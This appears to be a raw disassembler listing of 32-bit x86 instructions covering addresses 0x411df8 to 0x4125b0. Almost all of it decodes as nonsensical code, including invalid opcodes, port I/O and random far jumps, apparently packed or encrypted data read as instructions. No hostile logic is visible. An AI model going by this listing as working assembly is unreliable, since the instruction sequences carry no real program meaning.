  411df8:	int    0xd5
  411dfa:	mov    esi,DWORD PTR [eax]
  411dfc:	pop    edx
  411dfd:	cmc    
  411dfe:	js     0x411e7e
  411e00:	fcmove st,st(7)
  411e02:	aam    0x8
  411e04:	int    0xa4
  411e06:	test   al,0x12
  411e08:	xor    edx,DWORD PTR [edi]
  411e0a:	dec    edx
  411e0b:	dec    esp
  411e0c:	in     eax,dx
  411e0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e0e:	push   esi
  411e0f:	mov    edx,0x512f5ec4
  411e14:	gs in  al,dx
  411e16:	out    dx,al
  411e17:	shl    DWORD PTR [edx-0x80],1
  411e1a:	retf   
  411e1b:	and    al,0xcc
  411e1d:	(bad)  
  411e1e:	pop    ds
  411e1f:	mov    esp,0x3fc3b873
  411e24:	rcr    dl,cl
  411e26:	fmul   QWORD PTR [edx+ebp*1]
  411e29:	mov    WORD PTR [edi-0x46d23c40],ds
  411e2f:	(bad)  
  411e30:	(bad)  
  411e31:	ins    DWORD PTR es:[edi],dx
  411e32:	and    DWORD PTR [ebp+0x49],edx
  411e35:	pop    eax
  411e36:	push   ebp
  411e37:	push   edx
  411e38:	pusha  
  411e39:	push   ebp
  411e3a:	pop    esp
  411e3b:	in     eax,dx
  411e3c:	mov    ah,BYTE PTR [eax]
  411e3e:	popf   
  411e3f:	adc    al,0xe5
  411e41:	dec    edi
  411e42:	jbe    0x411ea6
  411e44:	xchg   DWORD PTR [ecx+ebp*4-0x656139b5],ecx
  411e4b:	in     al,dx
  411e4c:	jp     0x411eab
  411e4e:	push   0x3a80d26d
  411e53:	out    0xab,eax
  411e55:	xlat   BYTE PTR ds:[ebx]
  411e56:	scas   al,BYTE PTR es:[edi]
  411e57:	mov    eax,0x9af3dc2
  411e5c:	dec    ebp
  411e5d:	nop
  411e5e:	inc    esi
  411e5f:	fs mov dl,0xee
  411e62:	sbb    ax,0x862a
  411e66:	repnz inc esi
  411e68:	add    BYTE PTR [ecx-0x46],bh
  411e6b:	mov    ss,WORD PTR [eax-0x79]
  411e6e:	xor    eax,0x1d0ba766
  411e73:	mov    bl,0xcb
  411e75:	fiadd  WORD PTR [edi-0x63fa7ec7]
  411e7b:	cdq    
  411e7c:	or     eax,0x63881b86
  411e81:	inc    esp
  411e82:	lods   eax,DWORD PTR ds:[esi]
  411e83:	mov    al,ds:0x69333d3a
  411e88:	fcomp  QWORD PTR [ebp-0x4d]
  411e8b:	repnz daa 
  411e8d:	mov    edx,0x33737bf1
  411e92:	mov    ebx,0x520ed0ce
  411e97:	xchg   edi,eax
  411e98:	pop    esi
  411e99:	mov    al,0x93
  411e9b:	ss lahf 
  411e9d:	cmp    DWORD PTR [edi],0xffffff82
  411ea0:	adc    DWORD PTR [ebp-0x1b4a78b9],esp
  411ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ea7:	stos   BYTE PTR es:[edi],al
  411ea8:	mov    al,ds:0xf505f0e1
  411ead:	fsubr  DWORD PTR [ebp-0x7b]
  411eb0:	sbb    al,0xc5
  411eb2:	mov    ah,dl
  411eb4:	push   cs
  411eb5:	icebp  
  411eb6:	popf   
  411eb7:	test   bh,bh
  411eb9:	xlat   BYTE PTR ds:[ebx]
  411eba:	pop    edx
  411ebb:	add    BYTE PTR ds:[esi+0xa0254e5],0x5b
  411ec3:	inc    edx
  411ec4:	ret    
  411ec5:	in     eax,dx
  411ec6:	fxch   st(4)
  411ec8:	cwde   
  411ec9:	sbb    al,0x7a
  411ecb:	sub    ecx,DWORD PTR [eax]
  411ecd:	inc    esp
  411ece:	xchg   DWORD PTR [esi+eax*4+0x6f237fba],ebp
  411ed5:	fimul  WORD PTR [edx+esi*2-0x23]
  411ed9:	jecxz  0x411f1d
  411edb:	mov    esp,0x56dafbb4
  411ee0:	les    esi,FWORD PTR [ebx+0x67]
  411ee3:	lea    cx,[esi-0x252a7fed]
  411eea:	lds    edx,FWORD PTR [ebx]
  411eec:	sub    eax,0xe3f74d87
  411ef1:	xor    eax,0xebfd1116
  411ef6:	test   al,0xbe
  411ef8:	dec    eax
  411ef9:	jg     0x411e7d
  411efb:	cmp    BYTE PTR [ebp+ebx*4+0x2],bh
  411eff:	sbb    ecx,DWORD PTR [eax-0x26]
  411f02:	div    DWORD PTR [ebx+esi*4+0x13]
  411f06:	jne    0x411efe
  411f08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f09:	pop    ss
  411f0a:	mov    ecx,0x918fffb4
  411f0f:	push   eax
  411f10:	sahf   
  411f11:	xor    ecx,DWORD PTR [ebx+0x5a]
  411f14:	xor    ch,BYTE PTR [edi]
  411f16:	or     DWORD PTR [esi-0x6f919d02],edx
  411f1c:	push   eax
  411f1d:	fdivr  QWORD PTR [ebx]
  411f1f:	mov    esi,0x81901dc
  411f24:	cmp    dl,0x50
  411f27:	adc    al,0xf9
  411f29:	pop    ds
  411f2a:	xor    esi,DWORD PTR [eax]
  411f2c:	jae    0x411f27
  411f2e:	cmp    bl,BYTE PTR [eax+edx*8-0x691020fa]
  411f35:	rcr    BYTE PTR [eax-0x6d],cl
  411f38:	pop    ecx
  411f39:	(bad)  
  411f3a:	mov    edx,0x72afb337
  411f3f:	cmc    
  411f40:	and    al,0x11
  411f42:	and    ah,BYTE PTR [ebx+0x73]
  411f45:	or     esi,edx
  411f47:	stos   DWORD PTR es:[edi],eax
  411f48:	ja     0x411f9c
  411f4a:	xor    eax,0x105c38e6
  411f4f:	test   al,0xcb
  411f51:	cmp    BYTE PTR [edi+0x21],cl
  411f54:	adc    BYTE PTR [esi],ah
  411f56:	shr    BYTE PTR [esi+ebp*2-0x3bf0e33f],1
  411f5d:	or     eax,0x2252deba
  411f62:	dec    ecx
  411f63:	fwait
  411f64:	push   edi
  411f65:	nop
  411f66:	xchg   edx,eax
  411f67:	jle    0x411efd
  411f69:	mov    al,ds:0xdd6508ba
  411f6e:	lahf   
  411f6f:	clc    
  411f70:	inc    ebx
  411f71:	ins    BYTE PTR es:[edi],dx
  411f72:	ror    DWORD PTR [ebx+0x7d8bc455],0xfc
  411f79:	xor    edi,eax
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	or     al,0x8
  411f90:	dec    ebp
  411f91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f92:	jmp    0x411fff
  411f94:	js     0x41200e
  411f96:	in     eax,0x7e
  411f98:	js     0x412012
  411f9a:	pop    ds
  411f9b:	jo     0x411f49
  411f9d:	add    DWORD PTR [edx],0xd4aa54ab
  411fa3:	out    dx,al
  411fa4:	inc    esp
  411fa5:	mov    cl,0x70
  411fa7:	xchg   ebx,eax
  411fa8:	push   cs
  411fa9:	jl     0x411fcb
  411fab:	mov    bl,0x34
  411fad:	add    al,0x5b
  411faf:	jmp    0x616c:0xf5addc9f
  411fb6:	xor    ch,BYTE PTR [ecx]
  411fb8:	js     0x412006
  411fba:	daa    
  411fbb:	add    eax,0x4c463077
  411fc0:	sub    DWORD PTR [esi-0x4c],ebp
  411fc3:	scas   eax,DWORD PTR es:[edi]
  411fc4:	out    0xbe,eax
  411fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fc7:	and    edx,DWORD PTR [esi-0xf]
  411fca:	mov    edi,0x890c538a
  411fcf:	sub    DWORD PTR [esi],esp
  411fd1:	xchg   esi,eax
  411fd2:	scas   eax,DWORD PTR es:[edi]
  411fd3:	(bad)  
  411fd4:	and    dl,BYTE PTR [esi]
  411fd6:	cmp    al,0xd2
  411fd8:	jle    0x411fd6
  411fda:	fnstsw WORD PTR [ecx]
  411fdc:	push   edx
  411fdd:	push   esp
  411fde:	mov    cl,0xcf
  411fe0:	lods   eax,DWORD PTR ds:[esi]
  411fe1:	retf   
  411fe2:	xchg   ebp,esi
  411fe4:	mov    edi,0xbec3ee6c
  411fe9:	xchg   ebx,eax
  411fea:	fistp  WORD PTR [ebx-0x78]
  411fed:	jecxz  0x412046
  411fef:	and    al,0x44
  411ff1:	or     BYTE PTR [eax+eax*2-0x53282b29],bh
  411ff8:	and    bh,BYTE PTR [edx+0x50]
  411ffb:	inc    ecx
  411ffc:	popa   
  411ffd:	iret   
  411ffe:	xchg   edi,eax
  411fff:	scas   eax,DWORD PTR es:[edi]
  412000:	push   ebp
  412001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412002:	aad    0xa1
  412004:	les    edx,FWORD PTR [edi-0x7c]
  412007:	jmp    0x74ce8c2b
  41200c:	addr16 fdivr st,st(0)
  41200f:	mov    dl,0xa0
  412011:	jl     0x412027
  412013:	ficomp DWORD PTR [esi+0x27582f33]
  412019:	outs   dx,DWORD PTR ds:[esi]
  41201a:	pop    ss
  41201b:	jb     0x411faf
  41201d:	mov    ebx,ss
  41201f:	or     edi,eax
  412021:	int    0x95
  412023:	test   eax,0xd99528dc
  412028:	jmp    0x3a3321ea
  41202d:	mov    eax,0xc5eff7d4
  412032:	xor    al,0x22
  412034:	test   eax,0x99ce6064
  412039:	cmp    ch,BYTE PTR [ecx-0x80]
  41203c:	sbb    eax,0x1a9fbb10
  412041:	rcl    BYTE PTR [eax+0x68],0x97
  412045:	inc    edx
  412046:	je     0x4120a2
  412048:	sbb    al,BYTE PTR [ebx+ebx*1+0x6a]
  41204c:	push   cs
  41204d:	xchg   ebp,eax
  41204e:	jae    0x411fdd
  412050:	inc    ebp
  412051:	adc    eax,0xbf367e21
  412056:	gs push ecx
  412058:	cmp    ch,BYTE PTR [eax]
  41205a:	shld   esp,esp,cl
  41205d:	shl    edx,0x70
  412060:	sub    eax,0x74183d89
  412065:	sub    bl,BYTE PTR [ecx-0x69bfa486]
  41206b:	test   al,0xbe
  41206d:	add    eax,0x954be44c
  412072:	mov    al,0x2f
  412074:	pushf  
  412075:	test   eax,0x42e1736e
  41207a:	pop    ds
  41207b:	clc    
  41207c:	and    ebp,0xf4a3378b
  412082:	aad    0x9f
  412084:	aas    
  412085:	call   0x4817387c
  41208a:	push   ss
  41208b:	jb     0x412047
  41208d:	jle    0x4120fc
  41208f:	(bad)  
  412090:	sahf   
  412091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412092:	jle    0x4120a0
  412094:	cmp    ebx,DWORD PTR [ebp-0x216cc3be]
  41209a:	aam    0xb8
  41209c:	(bad)  
  41209d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41209e:	mov    WORD PTR ds:0x69a0dcd6,fs
  4120a4:	sub    DWORD PTR [edi+ecx*2],esi
  4120a7:	xchg   ecx,eax
  4120a8:	mov    ds:0x4bf8308e,al
  4120ad:	add    eax,0x54ec32df
  4120b2:	int    0xf1
  4120b4:	lods   al,BYTE PTR ds:[esi]
  4120b5:	sbb    BYTE PTR [edx],al
  4120b7:	sub    eax,0xe922b074
  4120bc:	out    dx,eax
  4120bd:	mov    ebx,DWORD PTR [eax-0x2c]
  4120c0:	arpl   WORD PTR [eax],ax
  4120c2:	pop    ds
  4120c3:	mov    eax,0x2c0314b6
  4120c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120c9:	arpl   WORD PTR [ebx-0x7740aae9],cx
  4120cf:	mov    edx,0x5ebed964
  4120d4:	push   0xffffff88
  4120d6:	add    BYTE PTR [eax],ch
  4120d8:	dec    eax
  4120d9:	fisttp DWORD PTR [ecx+0x2e]
  4120dc:	(bad)  
  4120dd:	cmp    ecx,DWORD PTR [ebx-0x9]
  4120e0:	add    esi,ebx
  4120e2:	adc    BYTE PTR ds:[ebx-0x4c],0xbd
  4120e7:	mov    DWORD PTR [ebx+0x6c],ebp
  4120ea:	and    ebx,DWORD PTR [ebx]
  4120ec:	ins    BYTE PTR es:[edi],dx
  4120ed:	bound  ebx,QWORD PTR [eax]
  4120ef:	fldenv [eax-0x6428b58a]
  4120f5:	out    0x14,al
  4120f7:	sti    
  4120f8:	scas   eax,DWORD PTR es:[edi]
  4120f9:	jmp    0x65e0:0x49bddfcf
  412100:	cmp    al,0x3a
  412102:	scas   eax,DWORD PTR es:[edi]
  412103:	call   0xc1768034
  412108:	dec    esp
  412109:	(bad)  
  41210a:	sub    ch,cl
  41210c:	inc    edi
  41210d:	test   al,0x7d
  41210f:	inc    eax
  412110:	inc    eax
  412111:	in     al,dx
  412112:	fwait
  412113:	cmp    bl,BYTE PTR [ecx-0x43]
  412116:	and    DWORD PTR [edx+0x54ccdd79],edi
  41211c:	xor    ch,BYTE PTR [edi+0x4]
  41211f:	and    dl,BYTE PTR [ebp+0x7175085f]
  412125:	fstp   st(1)
  412127:	aas    
  412128:	or     esi,ebp
  41212a:	mov    DWORD PTR [ebp+0x23],0xf4e376d8
  412131:	out    0x18,eax
  412133:	inc    esi
  412134:	or     al,0x18
  412136:	shr    BYTE PTR [ebx-0x73],1
  412139:	pop    esp
  41213a:	stos   DWORD PTR es:[edi],eax
  41213b:	(bad)  [edx+0x69]
  41213e:	push   esp
  41213f:	les    esi,FWORD PTR [ecx+esi*1]
  412142:	cmp    DWORD PTR [ebx],edi
  412144:	adc    BYTE PTR ds:0x9273ed7b,ch
  41214a:	or     esi,eax
  41214c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41214d:	push   0x8b6d7a66
  412152:	call   0x9bab:0x608d377b
  412159:	mov    edi,0x2f0f5237
  41215e:	call   0x37b399dd
  412163:	enter  0xdc5f,0xef
  412167:	pop    ecx
  412168:	hlt    
  412169:	into   
  41216a:	pop    ebp
  41216b:	loopne 0x412108
  41216d:	ret    0xbdec
  412170:	push   edi
  412171:	xor    cl,BYTE PTR [edi-0x43]
  412174:	or     BYTE PTR [edi-0x1dde5760],bl
  41217a:	push   edx
  41217b:	fnsave [eax-0x61]
  41217e:	adc    ah,BYTE PTR [ebx]
  412180:	jecxz  0x4121b8
  412182:	fld    QWORD PTR [edi+eax*4+0x617497cd]
  412189:	xchg   edx,eax
  41218a:	and    eax,0xfe254c13
  41218f:	jge    0x41217e
  412191:	ds test al,0xd4
  412194:	in     eax,dx
  412195:	pushf  
  412196:	jg     0x412130
  412198:	mov    WORD PTR [ebp+0x19e62b86],ds
  41219e:	(bad)  
  41219f:	in     eax,dx
  4121a0:	test   eax,0xbb52b7c9
  4121a5:	sub    eax,0x59d0f961
  4121aa:	(bad)  
  4121ac:	stos   DWORD PTR es:[edi],eax
  4121ad:	sbb    eax,0x967a3b34
  4121b2:	pop    ecx
  4121b3:	out    dx,al
  4121b4:	fs jnp 0x41218c
  4121b7:	pop    es
  4121b8:	inc    bx
  4121ba:	xchg   eax,ecx
  4121bc:	xchg   esp,eax
  4121bd:	or     al,0xbc
  4121bf:	scas   al,BYTE PTR es:[edi]
  4121c0:	repnz stc 
  4121c2:	test   eax,0x7a4b8118
  4121c7:	(bad)
  4121ca:	xor    BYTE PTR [ebx-0x66cbe307],ch
  4121d0:	push   ecx
  4121d1:	adc    dh,bh
  4121d3:	inc    eax
  4121d4:	imul   esp,DWORD PTR [edx-0x55],0x915cb3fa
  4121db:	clc    
  4121dc:	mov    eax,ds:0xe2668502
  4121e1:	int3   
  4121e2:	mov    es,WORD PTR [ebp-0x3c7335ca]
  4121e8:	or     al,0x60
  4121ea:	fsub   QWORD PTR [esi]
  4121ec:	pop    ebp
  4121ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121ee:	or     al,0x5c
  4121f0:	pop    ecx
  4121f1:	pop    edx
  4121f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121f3:	cmp    eax,0x4ff31d77
  4121f8:	sbb    al,0xce
  4121fa:	jle    0x4121a3
  4121fc:	cmp    DWORD PTR [ebx],0xf4f384a
  412202:	xchg   ebp,eax
  412203:	adc    DWORD PTR [edi+0x3],0xfffffff9
  412207:	add    edx,ecx
  412209:	imul   edx,edi
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	sub    eax,0x50469dd7
  412238:	imul   edi,DWORD PTR [eax+0x78],0x78787ee5
  41223f:	xor    BYTE PTR [edi-0x66f90ed1],dh
  412245:	sbb    esi,eax
  412247:	or     DWORD PTR [ebp+ebx*4+0x585fb372],esi
  41224e:	(bad)  
  412250:	pop    es
  412251:	cld    
  412252:	test   DWORD PTR [eax-0x1b],ecx
  412255:	mov    fs,edi
  412257:	xchg   ecx,eax
  412258:	rol    DWORD PTR [edi+0x71],0x74
  41225c:	jmp    0x4d01:0x42e4d8fc
  412263:	mov    ds,WORD PTR [ebx]
  412265:	mov    bl,0x6
  412267:	and    edx,edi
  412269:	mov    ch,BYTE PTR [esi]
  41226b:	das    
  41226c:	inc    edi
  41226d:	or     dh,BYTE PTR [ebx-0x3d55d381]
  412273:	repz inc edi
  412275:	push   ebp
  412276:	icebp  
  412277:	pop    eax
  412278:	in     al,0x3
  41227a:	dec    esi
  41227b:	jae    0x4122fa
  41227d:	and    eax,0x82b11bc6
  412282:	aam    0xc3
  412284:	pop    esp
  412285:	pop    eax
  412286:	scas   eax,DWORD PTR es:[edi]
  412287:	fucomp st(5)
  412289:	test   eax,0xa32dd818
  41228e:	ret    0x1443
  412291:	inc    esp
  412292:	ficom  WORD PTR [ecx+edi*4]
  412295:	xchg   ebp,eax
  412296:	dec    esp
  412297:	popf   
  412298:	xor    ecx,esp
  41229a:	and    eax,0x17e65b4c
  41229f:	sub    al,0x78
  4122a1:	xchg   ebx,esi
  4122a3:	into   
  4122a4:	add    DWORD PTR [ecx+eiz*8],0xffffffae
  4122a8:	xor    eax,0xe5b27a49
  4122ad:	mov    ecx,0x21974bc0
  4122b2:	dec    ebp
  4122b3:	data16 cmp BYTE PTR [edx-0x767a5203],al
  4122ba:	mov    ebp,0x495b40fd
  4122bf:	push   ss
  4122c0:	inc    ecx
  4122c1:	xchg   ecx,eax
  4122c2:	in     eax,dx
  4122c3:	push   si
  4122c5:	jp     0x4122da
  4122c7:	push   ss
  4122c8:	add    al,0xce
  4122ca:	mov    ah,0xd5
  4122cc:	push   esi
  4122cd:	mov    ds:0xdbc2e56b,al
  4122d2:	loop   0x41231b
  4122d4:	in     eax,0x70
  4122d6:	jnp    0x412280
  4122d8:	js     0x4122cf
  4122da:	rol    DWORD PTR [edx+0x7b0872fb],0xb4
  4122e1:	or     edi,DWORD PTR [esi+0x0]
  4122e4:	pop    esp
  4122e5:	jmp    0x412292
  4122e7:	jle    0x412349
  4122e9:	and    BYTE PTR [ebp-0x52],bh
  4122ec:	inc    edx
  4122ed:	push   ecx
  4122ee:	test   al,0xe9
  4122f0:	dec    edx
  4122f1:	jns    0x4122b2
  4122f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122f4:	bound  esi,QWORD PTR [eax]
  4122f6:	popf   
  4122f7:	iret   
  4122f8:	pop    esp
  4122f9:	pop    ecx
  4122fa:	into   
  4122fb:	or     edx,ebp
  4122fd:	cmp    ch,dl
  4122ff:	pop    esi
  412300:	xchg   ecx,eax
  412301:	test   DWORD PTR [edx],esp
  412303:	cmp    ch,ah
  412305:	and    al,0x1b
  412307:	cdq    
  412308:	out    0x2b,eax
  41230a:	xchg   esp,eax
  41230b:	sbb    eax,edi
  41230d:	in     eax,0xc0
  41230f:	rol    DWORD PTR [edi],1
  412311:	sti    
  412312:	push   ebx
  412313:	int3   
  412314:	pop    edi
  412315:	pusha  
  412316:	cmp    eax,0x3cc8e5ca
  41231b:	push   esi
  41231c:	xchg   ebp,eax
  41231d:	retf   
  41231e:	add    BYTE PTR [eax+eiz*2+0x499cce61],bh
  412325:	sub    DWORD PTR [ebx],0x53252940
  41232b:	loopne 0x412305
  41232d:	and    BYTE PTR [eax],cl
  41232f:	jno    0x412318
  412331:	dec    ebx
  412332:	and    eax,0x7511a8e7
  412337:	jge    0x412315
  412339:	cmp    BYTE PTR [ebx],0x22
  41233c:	ret    
  41233d:	out    0x4b,eax
  41233f:	lahf   
  412340:	ret    0xac6b
  412343:	mov    bh,BYTE PTR ds:0xdd06d86f
  412349:	sbb    eax,0xb4a17265
  41234e:	arpl   WORD PTR [edx-0x32],si
  412351:	inc    ebp
  412352:	xlat   BYTE PTR ds:[ebx]
  412353:	cmp    ah,BYTE PTR [ebp+ebp*1+0x68ac280d]
  41235a:	or     BYTE PTR [edx-0x2702c151],0xd5
  412361:	sub    dh,cl
  412363:	add    eax,0x768f8aa1
  412368:	arpl   WORD PTR [edx-0x2d747318],dx
  41236e:	sahf   
  41236f:	xchg   ebp,eax
  412370:	outs   dx,DWORD PTR ds:[esi]
  412371:	xchg   DWORD PTR [ecx-0x4b],esi
  412374:	fcomp  DWORD PTR [ebx]
  412376:	jl     0x41230c
  412378:	cmp    bh,BYTE PTR [edx-0x77eadf23]
  41237e:	push   cs
  41237f:	pop    edx
  412380:	daa    
  412381:	mov    WORD PTR gs:[edx-0x3984a741],ss
  412388:	push   ebp
  412389:	pop    ebp
  41238a:	mov    dl,0x95
  41238c:	mov    ch,0x1
  41238e:	xlat   BYTE PTR ds:[ebx]
  41238f:	mov    edx,0x7bb96d1
  412394:	mov    ds:0x7ae1fbd3,eax
  412399:	mov    ch,0x70
  41239b:	sahf   
  41239c:	jae    0x4123c2
  41239e:	mov    eax,0xf5465b95
  4123a3:	jb     0x41232b
  4123a5:	mul    BYTE PTR [esi+0x4bdcb055]
  4123ab:	and    BYTE PTR [ebx],bl
  4123ad:	adc    edx,eax
  4123af:	lock xchg BYTE PTR [esi-0x46545714],bh
  4123b6:	or     al,0x6
  4123b8:	call   0x58eb:0x89a7daac
  4123bf:	cmp    ebx,DWORD PTR [ebp+0x5f8e3bd6]
  4123c5:	inc    edi
  4123c6:	fwait
  4123c7:	mov    dh,0x67
  4123c9:	out    0xf1,eax
  4123cb:	xlat   BYTE PTR ds:[ebx]
  4123cc:	outs   dx,BYTE PTR ds:[esi]
  4123cd:	pop    ebp
  4123ce:	sahf   
  4123cf:	enter  0xe574,0x85
  4123d3:	test   eax,0xdfecc470
  4123d8:	repz dec ebx
  4123da:	(bad)  
  4123db:	les    eax,FWORD PTR [edi+esi*1-0x48]
  4123df:	(bad)  
  4123e1:	into   
  4123e2:	mov    BYTE PTR [esi+0x4],dl
  4123e5:	int3   
  4123e6:	push   esp
  4123e7:	js     0x412394
  4123e9:	test   eax,0xaf333750
  4123ee:	es into 
  4123f0:	dec    edx
  4123f1:	fnsave [edi+0x8]
  4123f4:	cmp    eax,0x76bab521
  4123f9:	push   es
  4123fa:	fwait
  4123fb:	inc    ebx
  4123fc:	push   ss
  4123fd:	aaa    
  4123fe:	cs test al,0xdb
  412401:	aas    
  412402:	add    BYTE PTR [eax],al
  412404:	(bad)  
  412405:	aam    0xe1
  412407:	retf   0x8f52
  41240a:	jae    0x4123f7
  41240c:	push   es
  41240d:	adc    ah,BYTE PTR [ecx-0x62]
  412410:	sub    edx,eax
  412412:	pop    ds
  412413:	lods   eax,DWORD PTR ds:[esi]
  412414:	sbb    eax,0xa4fcd5e8
  412419:	shl    BYTE PTR [eax],1
  41241b:	test   eax,0xcc1afe80
  412420:	pop    esp
  412421:	inc    edx
  412422:	je     0x412424
  412424:	stos   BYTE PTR es:[edi],al
  412425:	cs int 0x59
  412428:	mov    bh,0xfa
  41242a:	js     0x4123f4
  41242c:	call   0xc698:0xb3bda8c7
  412433:	push   ss
  412434:	dec    ebx
  412435:	pop    ebp
  412436:	jecxz  0x412431
  412438:	outs   dx,BYTE PTR ds:[esi]
  412439:	ds inc ebx
  41243b:	ret    0x6023
  41243e:	nop
  41243f:	outs   dx,DWORD PTR ds:[esi]
  412440:	or     DWORD PTR [ecx-0x76],esp
  412443:	int    0x79
  412445:	xchg   edi,eax
  412446:	and    bl,BYTE PTR [edi-0x41fba4be]
  41244c:	pop    es
  41244d:	sbb    ebx,DWORD PTR [edi]
  41244f:	rol    DWORD PTR ds:0x4d0f413d,cl
  412455:	cli    
  412456:	jecxz  0x41241e
  412458:	jle    0x4124bb
  41245a:	scas   al,BYTE PTR es:[edi]
  41245b:	outs   dx,BYTE PTR ds:[esi]
  41245c:	ret    
  41245d:	sahf   
  41245e:	es inc esi
  412460:	adc    eax,0x30dfb56e
  412465:	(bad)  
  412466:	(bad)  
  412467:	lock inc BYTE PTR [edi+0xeac9109]
  41246e:	jle    0x412451
  412470:	xchg   esp,eax
  412471:	mov    BYTE PTR [ecx+0x3a13ee03],cl
  412477:	push   edx
  412478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412479:	push   cs
  41247a:	push   edi
  41247b:	shr    bh,cl
  41247d:	retf   
  41247e:	cmc    
  41247f:	loopne 0x412464
  412481:	popa   
  412482:	mov    cs,WORD PTR fs:[edx+0x106f5956]
  412489:	jnp    0x412493
  41248b:	add    BYTE PTR ds:0x4948dafc,bl
  412491:	hlt    
  412492:	ja     0x41250e
  412494:	imul   edi,DWORD PTR [esi],0xfcd1fa02
  41249a:	pop    edx
  41249b:	mov    ecx,?
  41249d:	test   al,0x48
  41249f:	std    
  4124a0:	add    al,BYTE PTR [eax-0x5b2bda43]
  4124a6:	fs jmp 0xe9e4:0x5589025d
  4124ae:	add    DWORD PTR [edx],0x0
  4124b1:	add    bh,cl
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0xaf1ebe60
  4124bf:	pop    ecx
  4124c0:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4124c2:	cmp    eax,0xe578786e
  4124c7:	jle    0x412541
  4124c9:	js     0x4124ae
  4124cb:	push   eax
  4124cc:	(bad)  
  4124cd:	jecxz  0x4124bc
  4124cf:	and    bl,BYTE PTR [ebp+0x189614bc]
  4124d5:	fs xchg esi,eax
  4124d7:	ja     0x41248e
  4124d9:	sti    
  4124da:	test   esp,ebp
  4124dc:	dec    ebp
  4124dd:	scas   eax,DWORD PTR es:[edi]
  4124de:	adc    al,0x3d
  4124e0:	push   0x204e3d5a
  4124e5:	jno    0x412522
  4124e7:	and    DWORD PTR [ecx+0x1aced977],eax
  4124ed:	xchg   ecx,eax
  4124ee:	shr    edi,cl
  4124f0:	xchg   edx,eax
  4124f1:	imul   ebp,DWORD PTR [ecx],0xffffff81
  4124f4:	push   edi
  4124f5:	adc    ch,BYTE PTR [edi-0x3cc52553]
  4124fb:	nop
  4124fc:	repz je 0x4124e1
  4124ff:	mov    ecx,0x42e0fe95
  412504:	fcmovne st,st(2)
  412506:	call   0xb45d:0x2a329c06
  41250d:	test   DWORD PTR [eax],edx
  41250f:	in     al,0xc0
  412511:	dec    eax
  412512:	ret    0xb078
  412515:	ja     0x41257f
  412517:	mov    eax,0x2ed9edbb
  41251c:	xchg   ebp,eax
  41251d:	mov    BYTE PTR [ecx],dl
  41251f:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  412521:	push   ecx
  412522:	in     al,0xea
  412524:	jns    0x4125a4
  412526:	cmc    
  412527:	aad    0x3a
  412529:	int3   
  41252a:	loope  0x412595
  41252c:	lods   eax,DWORD PTR ds:[esi]
  41252d:	inc    esi
  41252f:	sbb    bl,bh
  412531:	loop   0x41257f
  412533:	das    
  412534:	arpl   si,cx
  412536:	inc    edi
  412537:	in     al,0x92
  412539:	in     eax,0xde
  41253b:	popa   
  41253c:	inc    eax
  41253d:	jge    0x412528
  41253f:	ins    BYTE PTR es:[edi],dx
  412540:	sbb    ch,0xbd
  412543:	push   ds
  412544:	iret   
  412545:	jp     0x412577
  412547:	or     esi,DWORD PTR [ebp-0x2d6aa54a]
  41254d:	and    al,0x68
  41254f:	fninit 
  412551:	sub    DWORD PTR [eax+0x48ace9c6],ebx
  412557:	mov    bh,0x36
  412559:	xor    BYTE PTR [esi+0x755f8e38],ah
  41255f:	out    0x21,al
  412561:	mov    eax,ds:0x33d3c0a9
  412566:	inc    ecx
  412567:	test   eax,0x1e95dc57
  41256c:	inc    edi
  41256d:	xor    al,0xd1
  41256f:	sub    DWORD PTR [edx-0x1c],esi
  412572:	std    
  412573:	mov    cl,BYTE PTR ds:0x3a980219
  412579:	sbb    al,dh
  41257b:	mov    eax,ds:0x2b87a9ed
  412580:	dec    edi
  412581:	inc    ebp
  412582:	fwait
  412583:	cmp    ah,BYTE PTR [eax-0x5a]
  412586:	adc    DWORD PTR [eax-0x8d56d89],edi
  41258c:	(bad)  
  41258d:	jno    0x4125b7
  41258f:	test   al,0x89
  412591:	outs   dx,DWORD PTR ds:[esi]
  412592:	int    0x41
  412594:	imul   edx,DWORD PTR [ebp-0x632c416b],0xffffffc3
  41259b:	cmp    edx,DWORD PTR [edi]
  41259d:	sbb    bh,dl
  41259f:	mov    bh,ch
  4125a1:	or     al,0xff
  4125a3:	push   ds
  4125a4:	loopne 0x41254b
  4125a6:	aam    0xf4
  4125a8:	arpl   WORD PTR [eax],di
  4125aa:	fsub   st(1),st
  4125ac:	pop    es
  4125ad:	stos   BYTE PTR es:[edi],al
  4125ae:	nop
  4125af:	clc    
  4125b0:	gs xchg ebx,eax
